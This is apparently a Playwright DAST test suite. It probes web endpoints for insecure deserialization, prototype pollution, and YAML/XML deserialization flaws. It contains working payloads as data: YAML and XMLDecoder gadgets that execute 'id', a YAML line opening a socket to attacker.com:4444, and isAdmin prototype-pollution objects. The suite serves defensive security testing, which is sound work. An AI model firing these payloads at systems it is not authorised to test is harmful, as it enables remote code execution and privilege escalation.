import { test, expect } from '@playwright/test';
import { DASTReporter } from '../utils/helpers';

const reporter = new DASTReporter();

// Deserialization payloads for various languages/frameworks
const deserializationPayloads = [
  // Java serialized object signature
  { 
    name: 'Java Serialized Object',
    content: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADmphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTExqYXZhL2xhbmcvU3RyaW5nO0wABGZpbGVxAH4AA0wABGhvc3RxAH4AA0wABHByb3R0AH4AA0wACHByb3RvY29scQB+AAN4cA==',
    type: 'java-serialized',
    contentType: 'application/x-java-serialized-object',
  },
  // PHP serialized
  {
    name: 'PHP Serialized',
    content: 'O:8:"stdClass":1:{s:4:"test";s:8:"testval";}', 
    type: 'php-serialized',
    contentType: 'application/x-php-serialized',
  },
  // PHP PHAR
  {
    name: 'PHP PHAR',
    content: Buffer.from([0x50, 0x48, 0x50, 0x00, 0x00, 0x00, 0x00]).toString('base64'),
    type: 'phar',
    contentType: 'application/octet-stream',
  },
  // Python pickle
  {
    name: 'Python Pickle',
    content: 'gASVDQAAAAAAAACMCXRlc3RfdmFsdWWULg==',
    type: 'python-pickle',
    contentType: 'application/x-python-pickle',
  },
  // Ruby Marshal
  {
    name: 'Ruby Marshal',
    content: Buffer.from([0x04, 0x08]).toString('base64'),
    type: 'ruby-marshal',
    contentType: 'application/x-ruby-marshal',
  },
  // Node.js vm.Script / eval
  {
    name: 'Node.js vm.Script',
    content: '{"constructor": {"prototype": {"isAdmin": true}}}',
    type: 'json-prototype',
    contentType: 'application/json',
  },
  // .NET ViewState-like
  {
    name: 'Base64 encoded data',
    content: '/wEPDwUKLTkyMzQ1Njc4OQ9kFgICAw9kFgICCw9kFgJmD2QWAgIBD2QWBAIBDxYCHgRUZXh0BRNIZWxsbyBmcm9tIFZpZXdTdGF0ZWRkAgMPFgIfAAUTSGVsbG8gZnJvbSBWaWV3U3RhdGVkZGQYAgUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFBGN0bDE=', 
    type: 'viewstate-like',
    contentType: 'application/x-viewstate',
  },
];

const deserializationErrorPatterns = [
  /java\.io\./i,
  /java\.lang\./i,
  /ClassNotFoundException/i,
  /InvalidClassException/i,
  /StreamCorruptedException/i,
  /unserialize\(\)/i,
  /__PHP_Incomplete_Class/i,
  /unpickling/i,
  /PickleError/i,
  /marshal data too short/i,
  /undefined method/i,
  /NoMethodError/i,
  /Invalid payload/i,
  /DeserializationException/i,
  /ObjectInputStream/i,
  /ObjectOutputStream/i,
];

test.describe('Insecure Deserialization Tests', () => {
  test('Check for deserialization vulnerabilities in API endpoints', async ({ request }) => {
    const apiEndpoints = [
      '/api/data',
      '/api/process',
      '/api/import',
      '/api/deserialize',
      '/api/object',
      '/api/execute',
    ];
    
    for (const endpoint of apiEndpoints) {
      for (const payload of deserializationPayloads) {
        try {
          // Test with base64 encoded
          const response = await request.post(endpoint, {
            data: { 
              data: payload.content,
              object: payload.content,
              input: payload.content,
            },
            headers: {
              'Content-Type': 'application/json',
            },
            timeout: 10000,
          });
          
          const body = await response.text();
          
          // Check for deserialization errors
          for (const pattern of deserializationErrorPatterns) {
            if (pattern.test(body)) {
              reporter.addFinding({
                severity: 'critical',
                title: 'Insecure Deserialization Detected',
                description: `Endpoint "${endpoint}" appears to deserialize untrusted data`,
                url: endpoint,
                evidence: `Pattern matched: ${pattern}`,
                cwe: 'CWE-502',
                owasp: 'A08:2021 - Software and Data Integrity Failures',
                recommendation: 'Avoid deserializing untrusted data. Use JSON or implement strict type constraints.',
              });
              break;
            }
          }
          
          // Check for successful deserialization (might indicate vulnerability)
          if (response.status() === 200) {
            const indicators = ['object', 'class', 'instance', 'deserialized', 'processed'];
            for (const indicator of indicators) {
              if (body.toLowerCase().includes(indicator)) {
                reporter.addFinding({
                  severity: 'high',
                  title: 'Potential Insecure Deserialization',
                  description: `Endpoint "${endpoint}" may deserialize user input`,
                  url: endpoint,
                  evidence: `Response indicator: "${indicator}"`,
                  cwe: 'CWE-502',
                  owasp: 'A08:2021 - Software and Data Integrity Failures',
                  recommendation: 'Validate and sanitize all serialized data before deserialization',
                });
                break;
              }
            }
          }
        } catch (e) {
          // Continue
        }
      }
    }
  });

  test('Check for Java deserialization in cookies', async ({ page, request }) => {
    await page.goto('/');
    
    const cookies = await page.context().cookies();
    
    for (const cookie of cookies) {
      // Check for Java serialized object signature (rO0AB - base64 of 0xAC 0xED 0x00 0x05)
      if (cookie.value.startsWith('rO0AB') || cookie.value.includes('H4sI')) {
        reporter.addFinding({
          severity: 'critical',
          title: 'Java Serialized Object in Cookie',
          description: `Cookie "${cookie.name}" contains Java serialized data`,
          url: page.url(),
          evidence: `Value starts with: ${cookie.value.substring(0, 20)}...`,
          cwe: 'CWE-502',
          owasp: 'A08:2021 - Software and Data Integrity Failures',
          recommendation: 'Avoid storing serialized objects in cookies. Use signed/encrypted tokens instead.',
        });
      }
      
      // Check for PHP serialized data
      if (/^[a-z]:\d+:/.test(cookie.value)) {
        reporter.addFinding({
          severity: 'high',
          title: 'PHP Serialized Data in Cookie',
          description: `Cookie "${cookie.name}" contains PHP serialized data`,
          url: page.url(),
          evidence: `Value: ${cookie.value.substring(0, 50)}...`,
          cwe: 'CWE-502',
          owasp: 'A08:2021 - Software and Data Integrity Failures',
          recommendation: 'Avoid storing serialized data in cookies. Use JSON Web Tokens instead.',
        });
      }
    }
  });

  test('Check for prototype pollution', async ({ request }) => {
    // Test for JavaScript prototype pollution
    const prototypePollutionPayloads = [
      { "constructor": { "prototype": { "isAdmin": true } } },
      { "__proto__": { "isAdmin": true } },
      { "constructor": { "prototype": { "polluted": true } } },
      { "__proto__.polluted": true },
    ];
    
    const endpoints = ['/api/users', '/api/settings', '/api/config', '/api/data'];
    
    for (const endpoint of endpoints) {
      for (const payload of prototypePollutionPayloads) {
        try {
          // Send pollution payload
          const polluteResponse = await request.post(endpoint, {
            data: payload,
            headers: { 'Content-Type': 'application/json' },
            timeout: 10000,
          });
          
          // Then check if pollution persisted
          const checkResponse = await request.get(endpoint, { timeout: 10000 });
          const body = await checkResponse.text();
          
          if (body.includes('isAdmin') || body.includes('polluted')) {
            reporter.addFinding({
              severity: 'critical',
              title: 'Prototype Pollution Vulnerability',
              description: `Endpoint "${endpoint}" is vulnerable to prototype pollution`,
              url: endpoint,
              payload: JSON.stringify(payload),
              cwe: 'CWE-915',
              owasp: 'A08:2021 - Software and Data Integrity Failures',
              recommendation: 'Use Object.freeze(Object.prototype) or libraries that prevent prototype pollution',
            });
          }
        } catch (e) {
          // Continue
        }
      }
    }
  });

  test('Check for YAML deserialization', async ({ request }) => {
    const yamlPayloads = [
      '!!python/object/apply:os.system ["id"]',
      '!!python/object/new:subprocess.Popen [["/bin/sh", "-c", "id"]]',
      '!!java.io.PrintWriter [!!java.net.Socket ["attacker.com", 4444]]',
    ];
    
    const yamlEndpoints = ['/api/yaml', '/api/parse', '/api/config', '/api/import'];
    
    for (const endpoint of yamlEndpoints) {
      for (const payload of yamlPayloads) {
        try {
          const response = await request.post(endpoint, {
            data: payload,
            headers: { 
              'Content-Type': 'application/x-yaml',
            },
            timeout: 10000,
          });
          
          const body = await response.text();
          
          // Check for indicators of code execution
          const execIndicators = [
            'uid=',
            'gid=',
            'root',
            'Windows IP Configuration',
            'Name: ',
          ];
          
          for (const indicator of execIndicators) {
            if (body.includes(indicator)) {
              reporter.addFinding({
                severity: 'critical',
                title: 'YAML Deserialization RCE',
                description: `Endpoint "${endpoint}" executes code from YAML input`,
                url: endpoint,
                evidence: `Output: ${body.substring(0, 200)}`,
                cwe: 'CWE-502',
                owasp: 'A08:2021 - Software and Data Integrity Failures',
                recommendation: 'Use safe_yaml or similar libraries that disable arbitrary object deserialization',
              });
              break;
            }
          }
        } catch (e) {
          // Continue
        }
      }
    }
  });

  test('Check for XML deserialization', async ({ request }) => {
    const xmlPayloads = [
      `<java>
        <object class="java.lang.Runtime" method="getRuntime">
          <method name="exec">
            <array class="java.lang.String" length="1">
              <void index="0"><string>id</string></void>
            </array>
          </method>
        </object>
      </java>`,
      `<serialized class="java.util.HashMap">
        <entry>
          <string>key</string>
          <string>value</string>
        </entry>
      </serialized>`,
    ];
    
    const xmlEndpoints = ['/api/xml', '/api/soap', '/api/process', '/api/import'];
    
    for (const endpoint of xmlEndpoints) {
      for (const payload of xmlPayloads) {
        try {
          const response = await request.post(endpoint, {
            data: payload,
            headers: { 'Content-Type': 'application/xml' },
            timeout: 10000,
          });
          
          const body = await response.text();
          
          if (body.includes('java.io') || body.includes('Runtime') || body.includes('exec')) {
            reporter.addFinding({
              severity: 'critical',
              title: 'XML Deserialization Vulnerability',
              description: `Endpoint "${endpoint}" may deserialize XML to objects`,
              url: endpoint,
              cwe: 'CWE-502',
              owasp: 'A08:2021 - Software and Data Integrity Failures',
              recommendation: 'Disable XML deserialization or use a safe parser configuration',
            });
          }
        } catch (e) {
          // Continue
        }
      }
    }
  });
});
